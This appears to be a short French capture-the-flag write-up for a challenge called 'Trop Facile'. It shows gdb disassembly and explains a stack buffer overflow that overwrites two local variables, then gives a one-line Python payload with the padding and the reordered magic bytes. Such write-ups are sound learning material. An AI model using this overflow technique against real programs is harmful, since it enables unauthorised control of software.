# Trop Facile

<img src="trop_facile.png" alt="trop_facile" width="400"/>

## `gdb compromis` :
```
   0x000000000040170b <+38>:    movl   $0xdeadbeef,-0x4(%rbp)
   0x0000000000401712 <+45>:    movl   $0xcafebebe,-0x8(%rbp)
   0x0000000000401719 <+52>:    mov    0xbbfb8(%rip),%rdx        # 0x4bd6d8 <stdin>
   0x0000000000401720 <+59>:    lea    -0x30(%rbp),%rax
   0x0000000000401724 <+63>:    mov    $0x31,%esi
   0x0000000000401729 <+68>:    mov    %rax,%rdi
   0x000000000040172c <+71>:    callq  0x40a910 <fgets>
   0x0000000000401731 <+76>:    cmpl   $0xcafebebe,-0x4(%rbp)
   0x0000000000401738 <+83>:    jne    0x401772 <main+141>
   0x000000000040173a <+85>:    cmpl   $0xdeadbeef,-0x8(%rbp)
   0x0000000000401741 <+92>:    jne    0x401772 <main+141>
```
## Solution

il suffit donc de modifier les valeurs de la stack aux positions %rbp -0x4 et -0x8

avec une longue string on peut override ces valeur par buffer overflow, vu que le buffer se trouve en %rbd -0x30

il reste a ecrire les valeurs au bon formats, dans le bon ordre : '\xef\xbe\xad\xde\xbe\xbe\xfe\xca'

`sys.stdout.buffer.write(b'a'*40 + b'\xef\xbe\xad\xde\xbe\xbe\xfe\xca' + b'\n')`